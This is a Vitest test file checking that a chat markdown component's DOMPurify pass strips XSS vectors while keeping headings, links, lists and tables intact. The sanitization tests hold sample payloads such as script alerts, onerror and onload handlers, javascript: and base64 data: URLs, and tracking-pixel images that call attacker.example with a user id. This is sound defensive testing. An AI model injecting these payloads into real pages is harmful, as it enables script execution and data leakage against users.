import { describe, it, expect } from 'vitest';
import { render } from '@testing-library/svelte';
import MessageContent from './MessageContent.svelte';

// MessageContent renders untrusted chat markdown via {@html}. The agent can echo
// attacker-controlled text (file contents, uploaded PDF text, search results,
// filenames) into chat, and this component renders in the top-level app origin
// that holds the session cookie. These tests assert the DOMPurify pass leaves no
// executable vector in the output while preserving legitimate markdown formatting.

function renderContent(content: string): HTMLElement {
	const { container } = render(MessageContent, { props: { content } });
	// The rendered markdown lives inside the .message-content wrapper.
	return container.querySelector('.message-content') as HTMLElement;
}

describe('MessageContent XSS sanitization', () => {
	it('strips <script> elements entirely', () => {
		const el = renderContent('<script>alert(1)</script>');
		expect(el.querySelector('script')).toBeNull();
		// No script anywhere in the subtree.
		expect(el.innerHTML.toLowerCase()).not.toContain('<script');
	});

	it('strips image elements instead of allowing their handlers or network requests', () => {
		const el = renderContent('<img src=x onerror="alert(1)">');
		expect(el.querySelector('img')).toBeNull();
		expect(el.innerHTML.toLowerCase()).not.toContain('onerror');
	});

	it('strips markdown and raw HTML images with attacker-controlled URLs', () => {
		const el = renderContent(
			[
				'![tracking pixel](https://attacker.example/pixel.png?user=123)',
				'<img src="//attacker.example/protocol-relative.png" alt="tracker">',
				'<img src="/api/quota" alt="same-origin request">'
			].join('\n')
		);

		expect(el.querySelector('img')).toBeNull();
		expect(el.innerHTML).not.toContain('attacker.example');
		expect(el.innerHTML).not.toContain('/api/quota');
	});

	it('neutralizes javascript: href from a markdown link', () => {
		const el = renderContent('[click](javascript:alert(1))');
		const anchor = el.querySelector('a');
		if (anchor) {
			const href = anchor.getAttribute('href') ?? '';
			expect(href.toLowerCase()).not.toContain('javascript:');
		}
		expect(el.innerHTML.toLowerCase()).not.toContain('javascript:');
	});

	it('neutralizes javascript: href from a raw <a> tag', () => {
		const el = renderContent('<a href="javascript:alert(1)">x</a>');
		const anchor = el.querySelector('a');
		if (anchor) {
			const href = anchor.getAttribute('href') ?? '';
			expect(href.toLowerCase()).not.toContain('javascript:');
		}
		expect(el.innerHTML.toLowerCase()).not.toContain('javascript:');
	});

	it('strips <iframe>', () => {
		const el = renderContent('<iframe src="evil"></iframe>');
		expect(el.querySelector('iframe')).toBeNull();
		expect(el.innerHTML.toLowerCase()).not.toContain('<iframe');
	});

	it('strips <svg> with onload handler', () => {
		const el = renderContent('<svg onload=alert(1)></svg>');
		expect(el.querySelector('svg')).toBeNull();
		expect(el.innerHTML.toLowerCase()).not.toContain('onload');
		expect(el.innerHTML.toLowerCase()).not.toContain('<svg');
	});

	it('strips <object> and <embed>', () => {
		const el = renderContent('<object data="evil"></object><embed src="evil">');
		expect(el.querySelector('object')).toBeNull();
		expect(el.querySelector('embed')).toBeNull();
	});

	it('strips data:text/html from a navigable anchor href', () => {
		// A data:text/html URI is dangerous in a navigable context. DOMPurify strips
		// it from href; image elements are independently forbidden above.
		const el = renderContent(
			'<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>'
		);
		const anchor = el.querySelector('a');
		if (anchor) {
			const href = anchor.getAttribute('href') ?? '';
			expect(href.toLowerCase()).not.toContain('data:text/html');
		}
		expect(el.innerHTML.toLowerCase()).not.toContain('data:text/html');
	});
});

describe('MessageContent legitimate markdown formatting', () => {
	it('renders a heading as <h1>', () => {
		const el = renderContent('# Heading');
		const h1 = el.querySelector('h1');
		expect(h1).not.toBeNull();
		expect(h1?.textContent).toBe('Heading');
	});

	it('renders bold text as <strong>', () => {
		const el = renderContent('**bold**');
		const strong = el.querySelector('strong');
		expect(strong).not.toBeNull();
		expect(strong?.textContent).toBe('bold');
	});

	it('renders a fenced code block as <pre><code>', () => {
		const el = renderContent('```js\nconst x = 1;\n```');
		const pre = el.querySelector('pre');
		expect(pre).not.toBeNull();
		expect(pre?.querySelector('code')).not.toBeNull();
		expect(pre?.textContent).toContain('const x = 1;');
	});

	it('renders a safe https link with its real href intact', () => {
		const el = renderContent('[link](https://example.com)');
		const anchor = el.querySelector('a');
		expect(anchor).not.toBeNull();
		expect(anchor?.getAttribute('href')).toBe('https://example.com');
		expect(anchor?.textContent).toBe('link');
		// External links are hardened, not stripped.
		expect(anchor?.getAttribute('rel')).toBe('noopener noreferrer');
	});

	it('renders a list with <li> items', () => {
		const el = renderContent('- one\n- two\n- three');
		const items = el.querySelectorAll('li');
		expect(items).toHaveLength(3);
		expect(items[0].textContent).toBe('one');
	});

	it('renders a GFM table', () => {
		const el = renderContent('| a | b |\n| --- | --- |\n| 1 | 2 |');
		expect(el.querySelector('table')).not.toBeNull();
		expect(el.querySelectorAll('th')).toHaveLength(2);
		expect(el.querySelectorAll('td')).toHaveLength(2);
	});
});
